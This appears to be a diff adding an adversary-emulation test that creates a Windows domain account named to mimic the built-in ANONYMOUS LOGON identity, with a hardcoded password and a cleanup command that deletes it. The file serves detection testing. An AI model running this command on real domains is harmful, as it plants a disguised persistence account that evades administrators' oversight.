@@ -1,0 +1,12 @@
+#TechniqueName: Create Account: Domain Account
+#AtomicTestName: Create a new account similar to ANONYMOUS LOGON
+#Description: Create a new account similar to ANONYMOUS LOGON in a command prompt.&
+#Language: cmd
+
+#commands
+net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+
+
+#cleanup_commands
+net user "ANONYMOUS  LOGON" >nul 2>&1 /del /domain
+
